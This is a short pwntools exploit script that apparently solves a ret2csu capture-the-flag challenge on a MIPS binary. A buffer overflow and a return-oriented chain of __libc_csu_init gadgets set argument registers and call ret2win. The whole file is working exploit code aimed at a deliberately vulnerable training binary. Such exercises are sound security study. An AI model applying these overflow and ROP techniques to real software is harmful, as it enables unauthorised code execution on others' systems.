from pwn import *

elf = ELF("ret2csu_mipsel")


context(arch="mips",endian="little")

#p = gdb.debug(elf.path,'''
#        break usefulFunction
#        break *pwnme+200
#        continue
#''')
p = process(elf.path)

ret2win = elf.symbols['ret2win']
many_load = 0x4009c0 # lw ra,52(sp); lw s5,48(sp); lw s4,44(sp); lw s3,40(sp); lw s2,36(sp); lw s1,32(sp); s0,28(sp); jr ra; addiu sp,sp,56;
csu_init2 = 0x4009a0 # lw t9,0(s0); addiu s1,s1,1; move $a2, $s5 ; move $a1, $s4 ; jalr $t9 ; move $a0, $s3

p.recvuntil("> ")

buf = b'A' * 36
buf += p32(many_load)
buf += b'S' * 4
buf += b'B' * (28 - 4)
buf += p32(0x411058) # s0
buf += b'B' * 4 # s1
buf += b'B' * 4 # s2
buf += p32(0xdeadbeef) # s3
buf += p32(0xcafebabe) # s4
buf += p32(0xd00df00d) # s5
buf += p32(csu_init2) # ra
buf += p32(ret2win)

p.send(buf)
p.interactive()
